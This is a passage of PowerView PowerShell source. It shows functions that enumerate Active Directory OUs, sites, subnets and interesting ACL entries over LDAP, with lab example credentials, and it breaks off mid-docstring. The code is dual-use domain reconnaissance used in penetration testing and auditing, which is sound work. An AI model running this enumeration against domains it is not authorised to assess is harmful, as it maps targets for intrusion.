$ResolvedSIDs[$_.SecurityIdentifier.Value]\n\n                        $InterestingACL = New-Object PSObject\n                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN\n                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier\n                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights\n                        if ($_.ObjectAceType) {\n                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType\n                        }\n                        else {\n                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'\n                        }\n                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags\n                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType\n                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags\n                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier\n                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName\n                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain\n                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN\n                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass\n                        $InterestingACL\n                    }\n                    else {\n                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments\n                        # \"IdentityReferenceDN: $IdentityReferenceDN\"\n\n                        if ($IdentityReferenceDN) {\n                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                            # \"IdentityReferenceDomain: $IdentityReferenceDomain\"\n                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain\n                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN\n                            # \"IdentityReferenceDN: $IdentityReferenceDN\"\n                            $Object = Get-DomainObject @ObjectSearcherArguments\n\n                            if ($Object) {\n                                $IdentityReferenceName = $Object.Properties.samaccountname[0]\n                                if ($Object.Properties.objectclass -match 'computer') {\n                                    $IdentityReferenceClass = 'computer'\n                                }\n                                elseif ($Object.Properties.objectclass -match 'group') {\n                                    $IdentityReferenceClass = 'group'\n                                }\n                                elseif ($Object.Properties.objectclass -match 'user') {\n                                    $IdentityReferenceClass = 'user'\n                                }\n                                else {\n                                    $IdentityReferenceClass = $Null\n                                }\n\n                                # save so we don't look up more than once\n                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass\n\n                                $InterestingACL = New-Object PSObject\n                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN\n                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier\n                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights\n                                if ($_.ObjectAceType) {\n                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType\n                                }\n                                else {\n                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'\n                                }\n                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags\n                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType\n                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags\n                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier\n                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName\n                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain\n                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN\n                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass\n                                $InterestingACL\n                            }\n                        }\n                        else {\n                            Write-Warning \"[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName\"\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainOU {\n<#\n.SYNOPSIS\n\nSearch for all organization units (OUs) or specific OU objects in AD.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Convert-LDAPProperty  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for all objects\nmatching the criteria. To only return specific properties, use\n\"-Properties whencreated,usnchanged,...\". By default, all OU objects for\nthe current domain are returned.\n\n.PARAMETER Identity\n\nAn OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or\nGUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted.\n\n.PARAMETER GPLink\n\nOnly return OUs with the specified GUID in their gplink property.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Raw\n\nSwitch. Return raw results instead of translating the fields into a custom PSObject.\n\n.EXAMPLE\n\nGet-DomainOU\n\nReturns the current OUs in the domain.\n\n.EXAMPLE\n\nGet-DomainOU *admin* -Domain testlab.local\n\nReturns all OUs with \"admin\" in their name in the testlab.local domain.\n\n.EXAMPLE\n\nGet-DomainOU -GPLink \"F260B76D-55C8-46C5-BEF1-9016DD98E272\"\n\nReturns all OUs with linked to the specified group policy object.\n\n.EXAMPLE\n\n\"*admin*\",\"*server*\" | Get-DomainOU\n\nSearch for OUs with the specific names.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainOU -Credential $Cred\n\n.OUTPUTS\n\nPowerView.OU\n\nCustom PSObject with translated OU property fields.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.OU')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        [Alias('GUID')]\n        $GPLink,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $OUSearcher = Get-DomainSearcher @SearcherArguments\n    }\n\n    PROCESS {\n        if ($OUSearcher) {\n            $IdentityFilter = ''\n            $Filter = ''\n            $Identity | Where-Object {$_} | ForEach-Object {\n                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                if ($IdentityInstance -match '^OU=.*') {\n                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                        #   and rebuild the domain searcher\n                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        Write-Verbose \"[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                        $SearcherArguments['Domain'] = $IdentityDomain\n                        $OUSearcher = Get-DomainSearcher @SearcherArguments\n                        if (-not $OUSearcher) {\n                            Write-Warning \"[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                        }\n                    }\n                }\n                else {\n                    try {\n                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\\$1'\n                        $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                    }\n                    catch {\n                        $IdentityFilter += \"(name=$IdentityInstance)\"\n                    }\n                }\n            }\n            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                $Filter += \"(|$IdentityFilter)\"\n            }\n\n            if ($PSBoundParameters['GPLink']) {\n                Write-Verbose \"[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property\"\n                $Filter += \"(gplink=*$GPLink*)\"\n            }\n\n            if ($PSBoundParameters['LDAPFilter']) {\n                Write-Verbose \"[Get-DomainOU] Using additional LDAP filter: $LDAPFilter\"\n                $Filter += \"$LDAPFilter\"\n            }\n\n            $OUSearcher.filter = \"(&(objectCategory=organizationalUnit)$Filter)\"\n            Write-Verbose \"[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)\"\n\n            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }\n            else { $Results = $OUSearcher.FindAll() }\n            $Results | Where-Object {$_} | ForEach-Object {\n                if ($PSBoundParameters['Raw']) {\n                    # return raw result objects\n                    $OU = $_\n                }\n                else {\n                    $OU = Convert-LDAPProperty -Properties $_.Properties\n                }\n                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')\n                $OU\n            }\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainOU] Error disposing of the Results object: $_\"\n                }\n            }\n            $OUSearcher.dispose()\n        }\n    }\n}\n\n\nfunction Get-DomainSite {\n<#\n.SYNOPSIS\n\nSearch for all sites or specific site objects in AD.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Convert-LDAPProperty  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for all objects\nmatching the criteria. To only return specific properties, use\n\"-Properties whencreated,usnchanged,...\". By default, all site objects for\nthe current domain are returned.\n\n.PARAMETER Identity\n\nAn site name (e.g. Test-Site), DistinguishedName (e.g. CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), or\nGUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.\n\n.PARAMETER GPLink\n\nOnly return sites with the specified GUID in their gplink property.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Raw\n\nSwitch. Return raw results instead of translating the fields into a custom PSObject.\n\n.EXAMPLE\n\nGet-DomainSite\n\nReturns the current sites in the domain.\n\n.EXAMPLE\n\nGet-DomainSite *admin* -Domain testlab.local\n\nReturns all sites with \"admin\" in their name in the testlab.local domain.\n\n.EXAMPLE\n\nGet-DomainSite -GPLink \"F260B76D-55C8-46C5-BEF1-9016DD98E272\"\n\nReturns all sites with linked to the specified group policy object.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainSite -Credential $Cred\n\n.OUTPUTS\n\nPowerView.Site\n\nCustom PSObject with translated site property fields.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.Site')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        [Alias('GUID')]\n        $GPLink,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    BEGIN {\n        $SearcherArguments = @{\n            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $SiteSearcher = Get-DomainSearcher @SearcherArguments\n    }\n\n    PROCESS {\n        if ($SiteSearcher) {\n            $IdentityFilter = ''\n            $Filter = ''\n            $Identity | Where-Object {$_} | ForEach-Object {\n                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                if ($IdentityInstance -match '^CN=.*') {\n                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                        #   and rebuild the domain searcher\n                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        Write-Verbose \"[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                        $SearcherArguments['Domain'] = $IdentityDomain\n                        $SiteSearcher = Get-DomainSearcher @SearcherArguments\n                        if (-not $SiteSearcher) {\n                            Write-Warning \"[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                        }\n                    }\n                }\n                else {\n                    try {\n                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\\$1'\n                        $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                    }\n                    catch {\n                        $IdentityFilter += \"(name=$IdentityInstance)\"\n                    }\n                }\n            }\n            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                $Filter += \"(|$IdentityFilter)\"\n            }\n\n            if ($PSBoundParameters['GPLink']) {\n                Write-Verbose \"[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property\"\n                $Filter += \"(gplink=*$GPLink*)\"\n            }\n\n            if ($PSBoundParameters['LDAPFilter']) {\n                Write-Verbose \"[Get-DomainSite] Using additional LDAP filter: $LDAPFilter\"\n                $Filter += \"$LDAPFilter\"\n            }\n\n            $SiteSearcher.filter = \"(&(objectCategory=site)$Filter)\"\n            Write-Verbose \"[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)\"\n\n            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }\n            else { $Results = $SiteSearcher.FindAll() }\n            $Results | Where-Object {$_} | ForEach-Object {\n                if ($PSBoundParameters['Raw']) {\n                    # return raw result objects\n                    $Site = $_\n                }\n                else {\n                    $Site = Convert-LDAPProperty -Properties $_.Properties\n                }\n                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')\n                $Site\n            }\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainSite] Error disposing of the Results object\"\n                }\n            }\n            $SiteSearcher.dispose()\n        }\n    }\n}\n\n\nfunction Get-DomainSubnet {\n<#\n.SYNOPSIS\n\nSearch for all subnets or specific subnets objects in AD.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Convert-LDAPProperty  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for all objects\nmatching the criteria. To only return specific properties, use\n\"-Properties whencreated,usnchanged,...\". By default, all subnet objects for\nthe current domain are returned.\n\n.PARAMETER Identity\n\nAn subnet name (e.g. '192.168.50.0/24'), DistinguishedName (e.g. 'CN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=local'),\nor GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.\n\n.PARAMETER SiteName\n\nOnly return subnets from the specified SiteName.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Raw\n\nSwitch. Return raw results instead of translating the fields into a custom PSObject.\n\n.EXAMPLE\n\nGet-DomainSubnet\n\nReturns the current subnets in the domain.\n\n.EXAMPLE\n\nGet-DomainSubnet *admin* -Domain testlab.local\n\nReturns all subnets with \"admin\" in their name in the testlab.local domain.\n\n.EXAMPLE\n\nGet-DomainSubnet -GPLink \"F260B76D-55C8-46C5-BEF1-9016DD98E272\"\n\nReturns all subnets with linked to the specified group policy object.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainSubnet -Credential $Cred\n\n.OUTPUTS\n\nPowerView.Subnet\n\nCustom PSObject with translated subnet property fields.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.Subnet')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $SiteName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    BEGIN {\n        $SearcherArguments = @{\n            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $SubnetSearcher = Get-DomainSearcher @SearcherArguments\n    }\n\n    PROCESS {\n        if ($SubnetSearcher) {\n            $IdentityFilter = ''\n            $Filter = ''\n            $Identity | Where-Object {$_} | ForEach-Object {\n                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                if ($IdentityInstance -match '^CN=.*') {\n                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                        #   and rebuild the domain searcher\n                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        Write-Verbose \"[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                        $SearcherArguments['Domain'] = $IdentityDomain\n                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments\n                        if (-not $SubnetSearcher) {\n                            Write-Warning \"[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                        }\n                    }\n                }\n                else {\n                    try {\n                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\\$1'\n                        $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                    }\n                    catch {\n                        $IdentityFilter += \"(name=$IdentityInstance)\"\n                    }\n                }\n            }\n            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                $Filter += \"(|$IdentityFilter)\"\n            }\n\n            if ($PSBoundParameters['LDAPFilter']) {\n                Write-Verbose \"[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter\"\n                $Filter += \"$LDAPFilter\"\n            }\n\n            $SubnetSearcher.filter = \"(&(objectCategory=subnet)$Filter)\"\n            Write-Verbose \"[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)\"\n\n            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }\n            else { $Results = $SubnetSearcher.FindAll() }\n            $Results | Where-Object {$_} | ForEach-Object {\n                if ($PSBoundParameters['Raw']) {\n                    # return raw result objects\n                    $Subnet = $_\n                }\n                else {\n                    $Subnet = Convert-LDAPProperty -Properties $_.Properties\n                }\n                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')\n\n                if ($PSBoundParameters['SiteName']) {\n                    # have to do the filtering after the LDAP query as LDAP doesn't let you specify\n                    #   wildcards for 'siteobject' :(\n                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like \"*$SiteName*\")) {\n                        $Subnet\n                    }\n                    elseif ($Subnet.siteobject -like \"*$SiteName*\") {\n                        $Subnet\n                    }\n                }\n                else {\n                    $Subnet\n                }\n            }\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainSubnet] Error disposing of the Results object: $_\"\n                }\n            }\n            $SubnetSearcher.dispose()\n        }\n    }\n}\n\n\nfunction Get-DomainSID {\n<#\n.SYNOPSIS\n\nReturns the SID for the current domain or the specified domain.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer  \n\n.DESCRIPTION\n\nReturns the SID for the current domain or the specified domain by executing\nGet-DomainComputer with the -LDAPFilter set to (userAccountControl:1.2.840.113556.1.4.803:=8192)\nto search for domain controllers through LDAP. The SID of the returned domain controller\nis then extracted.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER 